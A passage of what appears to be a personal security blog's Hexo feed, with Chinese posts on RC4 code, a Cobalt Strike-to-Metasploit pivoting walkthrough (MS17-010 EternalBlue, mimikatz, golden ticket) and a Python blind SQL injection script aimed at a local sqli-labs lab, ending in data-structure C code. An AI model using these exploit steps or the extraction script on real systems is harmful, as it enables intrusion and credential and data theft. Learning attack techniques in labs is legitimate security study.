class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">puts</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">decode</span><span class="token punctuation">(</span><span class="token keyword">int</span> len<span class="token punctuation">,</span><span class="token keyword">int</span> mlen<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">KSA</span><span class="token punctuation">(</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">generateKey</span><span class="token punctuation">(</span>mlen<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>mlen<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        data<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> data<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> ks<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"decode:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> len <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> mlen <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token function">encode</span><span class="token punctuation">(</span>len<span class="token punctuation">,</span>mlen<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">decode</span><span class="token punctuation">(</span>len<span class="token punctuation">,</span>mlen<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 密码学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RC4 </tag>
            
            <tag> 密码学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CS派生会话到msf</title>
      <link href="/2021/10/28/cs/"/>
      <url>/2021/10/28/cs/</url>
      
        <content type="html"><![CDATA[<h1 id="CS派生会话到msf"><a href="#CS派生会话到msf" class="headerlink" title="CS派生会话到msf"></a>CS派生会话到msf</h1><h2 id="CS派生会话到msf-1"><a href="#CS派生会话到msf-1" class="headerlink" title="CS派生会话到msf"></a>CS派生会话到msf</h2><p>在CS上创建一个监听</p><p><img src="/2021/10/28/cs/image-20230205191056211.png"></p><p>通过msfconsole监听use exploit&#x2F;multi&#x2F;handler</p><p>设置本地地址：set lhost</p><p>设置本地端口：set lport</p><p>设置payload：windows&#x2F;meterpreter&#x2F;reverse_http</p><p>run</p><p>开始监听 通过cs右键点击spawn</p><p>msf获得cs会话</p><p><img src="/2021/10/28/cs/image-20230205191240190.png"></p><h2 id="msf添加内网路由"><a href="#msf添加内网路由" class="headerlink" title="msf添加内网路由"></a>msf添加内网路由</h2><p>查看目标内网路由：run get_local_subnets</p><p><img src="/2021/10/28/cs/image-20230205191322350.png"></p><p>&#x2F;&#x2F;添加路由：run autoroute -s ip&#x2F;24</p><p>&#x2F;&#x2F;查看路由表：run autoroute -p</p><p><img src="/2021/10/28/cs/image-20230205191417075.png"></p><p>background回到msf添加路由：</p><p>msf&gt;route add ip 255.255.255.0 2#2表示session 2</p><p><img src="/2021/10/28/cs/image-20230205191545842.png"></p><h2 id="ms-17-010"><a href="#ms-17-010" class="headerlink" title="ms_17_010"></a>ms_17_010</h2><p>使用扫描模块use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010</p><p><img src="/2021/10/28/cs/image-20230205191654671.png"></p><p>完成扫描 利用exp的ms17_010上线</p><p>setg Proxies socks5:ip:1080</p><p>use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalbule</p><p>set rhost ip</p><p>set AutoRunScript migrate -f</p><p>set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp</p><p>run</p><p>上线</p><p>net user</p><p><img src="/2021/10/28/cs/image-20230205191830227.png"></p><p>上传mimikate.exe</p><p><img src="/2021/10/28/cs/image-20230205191919921.png"></p><p>寻找进程ps</p><p><img src="/2021/10/28/cs/image-20230205192006483.png"></p><p>迁移进进程migrate 396</p><p><img src="/2021/10/28/cs/image-20230205192025919.png"></p><h2 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h2><p>在域控上获取sid和NTLM</p><p><img src="/2021/10/28/cs/image-20230205192107974.png"></p><p>在域内用户上执行mimikatz</p><p><img src="/2021/10/28/cs/image-20230205192221160.png"></p><p>会生成一个</p><p><img src="/2021/10/28/cs/image-20230205192244460.png"></p><p>注入内存</p><p><img src="/2021/10/28/cs/image-20230205192310159.png"></p><p>查看域控目录</p><p><img src="/2021/10/28/cs/image-20230205192422304.png"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
            <tag> CS </tag>
            
            <tag> msf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>盲注脚本</title>
      <link href="/2021/05/07/%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC/"/>
      <url>/2021/05/07/%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<h1 id="盲注脚本"><a href="#盲注脚本" class="headerlink" title="盲注脚本"></a>盲注脚本</h1><p>来到sqli-labs-master的第八关传入id&#x3D;1</p><p><img src="/2021/05/07/%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC/image-20230210205649845.png"></p><p>尝试让页面报错</p><pre class="line-numbers language-none"><code class="language-none">?id&#x3D;1&#39; and 1&#x3D;1 # 页面正常?id&#x3D;1&#39; and 1&#x3D;2 # 页面无回显<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2021/05/07/%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC/image-20230210210020760.png"></p><p>可以利用页面是否出现’You are in’判断我们的SQL语句执行结构是否正确</p><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">import requestsurl &#x3D; &quot;http:&#x2F;&#x2F;localhost:83&#x2F;Less-8&#x2F;?id&#x3D;1&quot;def db_length(url): #判断数据库长度       for n in range (20): #循环输出url地址        payload&#x3D;url + &quot; &#39; and length(database())&gt;&#x3D; &#123;&#125; --+&quot;.format(n) #拼接url和payload        r&#x3D;requests.get(payload) #访问网站        if &#39;You&#39; in r.text: #判断You are in是否在出现在页面            l&#x3D;n    print(&quot;数据库长度:&quot;,l) #输出数据库长度    db_name(l) #传入数据名判断def db_name(l):        d_name &#x3D; &#39;&#39;        for i in range (1,l+1):            for s in range (128):                payload &#x3D; url +&quot; &#39; and (ord(substr(database(),&#123;&#125;,1))&#x3D;&#39;&#123;&#125;&#39;) --+&quot;.format(i,s)                r&#x3D;requests.get(payload)                if &#39;You&#39; in r.text:                    d_name +&#x3D; chr(s)        print(&#39;数据库名：&#123;&#125;&#39;.format(d_name))        db_table(d_name)def db_table(d_name):    for i in range(10):        payload &#x3D; url + &quot; &#39; and &#123;&#125;&#x3D;(select count(table_name) from information_schema.tables where table_schema&#x3D;&#39;&#123;&#125;&#39;) --+&quot;.format(i,d_name)        r &#x3D; requests.get(payload)        if &#39;You&#39; in r.text:            print(&#39;有&#123;&#125;个表&#39;.format(i))            print(&quot;..............&quot;)            table_n &#x3D; i    t_n(table_n,d_name)def t_n(table_n,d_name):        for i in range(table_n):        for j in range(1,10):            payload &#x3D; url + &quot; &#39; and (select length(table_name) from information_schema.tables where table_schema &#x3D; &#39;&#123;&#125;&#39; limit &#123;&#125;,1)&#x3D;&#123;&#125; --+&quot;.format(d_name,i,j)            r &#x3D; requests.get(payload)            if &#39;You&#39; in r.text:                table_l &#x3D; j                print(&quot;第&#123;&#125;张表名长：&#123;&#125;&quot;.format(i+1,table_l))                t_name &#x3D; &#39;&#39;                for k in range(1,table_l+1):                    for l in range(128):                        payload &#x3D; url + &quot; &#39; and ord((select substr(table_name,&#123;&#125;,1) from information_schema.tables where table_schema &#x3D; &#39;&#123;&#125;&#39; limit &#123;&#125;,1)) &#x3D; &#39;&#123;&#125;&#39; --+ &quot;.format(k,d_name,i,l)                        r &#x3D; requests.get(payload)                        if &#39;You&#39; in r.text:                            t_name +&#x3D; chr(l)                print(&quot;第&#123;&#125;张表名：&#123;&#125;&quot;.format(i+1,t_name))                tb_column(t_name)def tb_column(t_name):    for i in range(20):        payload &#x3D; url + &quot; &#39; and &#123;&#125;&#x3D;(select count(column_name) from information_schema.columns where table_name &#x3D; &#39;&#123;&#125;&#39;)  --+  &quot;.format(i,t_name)        r &#x3D; requests.get(payload)        if &#39;You&#39; in r.text:            print(&quot;&#123;&#125;表有&#123;&#125;列&quot;.format(t_name,i))            print(&quot;.......................&quot;)        for j in range(20):            payload &#x3D; url + &quot; &#39; and (select length(column_name) from information_schema.columns where table_name &#x3D; &#39;&#123;&#125;&#39; limit &#123;&#125;,1)&#x3D;&#123;&#125; --+&quot;.format(t_name,i,j)            r &#x3D; requests.get(payload)            if &#39;You&#39; in r.text:                print(&quot;第&#123;&#125;列名长：&#123;&#125;&quot;.format(i+1,j))                column_name(t_name,i,j)def column_name(t_name,c_number,c_length):    c_name &#x3D; &#39;&#39;    for i in range(1,c_length+1):        for l in range(128):            payload &#x3D; url + &quot; &#39; and ord((select substr(column_name,&#123;&#125;,1) from information_schema.columns where table_name &#x3D; &#39;&#123;&#125;&#39; limit &#123;&#125;,1)) &#x3D; &#39;&#123;&#125;&#39; --+&quot;.format(i,t_name,c_number,l)            r &#x3D; requests.get(payload)            if &#39;You&#39; in r.text:                c_name +&#x3D; chr(l)    print(&quot;列名为：&#123;&#125;&quot;.format(c_name))if __name__ &#x3D;&#x3D; &#39;__main__&#39;:   db_length(url)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>脚本运行的结果</p><p><img src="/2021/05/07/%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC/image-20230210210541182.png"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据结构各表实现</title>
      <link href="/2021/03/21/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%90%84%E8%A1%A8%E5%AE%9E%E7%8E%B0/"/>
      <url>/2021/03/21/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%90%84%E8%A1%A8%E5%AE%9E%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="数据结构各表实现"><a href="#数据结构各表实现" class="headerlink" title="数据结构各表实现"></a>数据结构各表实现</h1><h2 id="顺序表"><a href="#顺序表" class="headerlink" title="顺序表"></a>顺序表</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;malloc.h></span></span><span class="token keyword">typedef</span> <span class="token keyword">int</span> datatype<span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">maxsize</span> <span class="token expression"><span class="token number">10</span></span></span><span class="token keyword">typedef</span> <span class="token keyword">struct</span><span class="token punctuation">&#123;</span>  datatype <span class="token operator">*</span>a<span class="token punctuation">;</span>  <span class="token keyword">int</span> length<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>xxb<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">csh</span><span class="token punctuation">(</span>xxb <span class="token operator">*</span>L<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  L<span class="token operator">-></span>a<span class="token operator">=</span><span class="token punctuation">(</span>datatype <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>datatype<span class="token punctuation">)</span><span class="token operator">*</span>maxsize<span class="token punctuation">)</span><span class="token punctuation">;</span>  L<span class="token operator">-></span>length<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">insert</span><span class="token punctuation">(</span>xxb <span class="token operator">*</span>L<span class="token punctuation">,</span><span class="token keyword">int</span> i<span class="token punctuation">,</span>datatype x<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> j<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>L<span class="token operator">-></span>length <span class="token operator">==</span> maxsize<span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">printf</span> <span class="token punctuation">(</span><span class="token string">"man"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>i<span class="token operator">&lt;</span><span class="token number">1</span><span class="token operator">&amp;&amp;</span>i<span class="token operator">></span>L<span class="token operator">-></span>length <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span>j<span class="token operator">=</span>L<span class="token operator">-></span>length<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>j<span class="token operator">>=</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>j<span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  L<span class="token operator">-></span>a<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span>L<span class="token operator">-></span>a<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  L<span class="token operator">-></span>a<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span>x<span class="token punctuation">;</span>  L<span class="token operator">-></span>length<span class="token operator">++</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">select</span> <span class="token punctuation">(</span>xxb <span class="token operator">*</span>L<span class="token punctuation">,</span><span class="token keyword">int</span> i<span class="token punctuation">,</span>datatype <span class="token operator">*</span>x<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>i<span class="token operator">&lt;</span><span class="token number">1</span><span class="token operator">&amp;&amp;</span>i<span class="token operator">></span>L<span class="token operator">-></span>length<span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token operator">*</span>x<span class="token operator">=</span>L<span class="token operator">-></span>a<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">delect</span> <span class="token punctuation">(</span>xxb <span class="token operator">*</span>L<span class="token punctuation">,</span><span class="token keyword">int</span> i<span class="token punctuation">,</span>datatype <span class="token operator">*</span>x<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>i<span class="token operator">&lt;</span><span class="token number">1</span> <span class="token operator">&amp;&amp;</span> i<span class="token operator">></span>L<span class="token operator">-></span>length<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token operator">*</span>x<span class="token operator">=</span>L<span class="token operator">-></span>a<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">int</span> j<span class="token punctuation">;</span>  <span class="token keyword">for</span><span class="token punctuation">(</span>j<span class="token operator">=</span>L<span class="token operator">-></span>length<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span>i<span class="token punctuation">;</span>j<span class="token operator">--</span><span class="token punctuation">)</span>    L<span class="token operator">-></span>a<span class="token punctuation">[</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span>L<span class="token operator">-></span>a<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>  L<span class="token operator">-></span>length<span class="token operator">--</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  xxb l<span class="token punctuation">;</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span>  datatype x<span class="token punctuation">,</span> y<span class="token punctuation">;</span>  <span class="token function">csh</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>l<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"表长:%3d\n"</span><span class="token punctuation">,</span> l<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">5</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token function">insert</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>l<span class="token punctuation">,</span> i<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"插入数据的长度:%3d\n"</span><span class="token punctuation">,</span> l<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">5</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">select</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>l<span class="token punctuation">,</span> i<span class="token punctuation">,</span> <span class="token operator">&amp;</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"表里的数据：%3d\n"</span><span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"在第二个位置上插入8\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">insert</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>l<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 在第二个位置上插入8</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"插入后的长度：%3d\n"</span><span class="token punctuation">,</span> l<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> l<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">select</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>l<span class="token punctuation">,</span> i<span class="token punctuation">,</span> <span class="token operator">&amp;</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"表中的数据：%3d\n"</span><span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">delect</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>l<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"删除后的长度:%3d\n"</span><span class="token punctuation">,</span> l<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token keyword">typedef</span> <span class="token keyword">int</span> datatype<span class="token punctuation">;</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">node</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> data<span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">node</span> <span class="token operator">*</span>next<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>node<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">csh</span><span class="token punctuation">(</span>node <span class="token operator">*</span><span class="token operator">*</span>p<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token operator">*</span>p <span class="token operator">=</span> <span class="token punctuation">(</span>node<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">(</span><span class="token operator">*</span>p<span class="token punctuation">)</span><span class="token operator">-></span>next <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">length</span><span class="token punctuation">(</span>node<span class="token operator">*</span> head<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>node<span class="token operator">*</span> p<span class="token punctuation">;</span>p <span class="token operator">=</span> head<span class="token punctuation">;</span><span class="token keyword">int</span> n <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>p<span class="token operator">-></span>next<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>p <span class="token operator">=</span> p<span class="token operator">-></span>next<span class="token punctuation">;</span>n<span class="token operator">++</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> n<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">insert</span><span class="token punctuation">(</span>node <span class="token operator">*</span>head<span class="token punctuation">,</span><span class="token keyword">int</span> i<span class="token punctuation">,</span>datatype a<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>node <span class="token operator">*</span>p<span class="token punctuation">,</span><span class="token operator">*</span>q<span class="token punctuation">;</span>p <span class="token operator">=</span> head<span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span>j<span class="token operator">&lt;</span>i<span class="token operator">-</span><span class="token number">1</span> <span class="token operator">&amp;&amp;</span> p<span class="token operator">-></span>next<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>p <span class="token operator">=</span> p<span class="token operator">-></span>next<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span>j <span class="token operator">==</span> i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>q<span class="token operator">=</span><span class="token punctuation">(</span>node <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>q<span class="token operator">-></span>data <span class="token operator">=</span> a<span class="token punctuation">;</span>q<span class="token operator">-></span>next <span class="token operator">=</span> p<span class="token operator">-></span>next<span class="token punctuation">;</span>p<span class="token operator">-></span>next <span class="token operator">=</span> q<span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">select</span><span class="token punctuation">(</span>node <span class="token operator">*</span>head<span class="token punctuation">,</span><span class="token keyword">int</span> i<span class="token punctuation">,</span>datatype <span class="token operator">*</span>x<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>node <span class="token operator">*</span>p<span class="token punctuation">;</span>p <span class="token operator">=</span> head<span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span>j <span class="token operator">&lt;</span> i<span class="token operator">-</span><span class="token number">1</span> <span class="token operator">&amp;&amp;</span> p <span class="token operator">-></span> next<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>p <span class="token operator">=</span> p<span class="token operator">-></span>next<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span>j <span class="token operator">==</span> i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token operator">*</span>x <span class="token operator">=</span> p<span class="token operator">-></span>next<span class="token operator">-></span>data<span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">1</span><span class="token 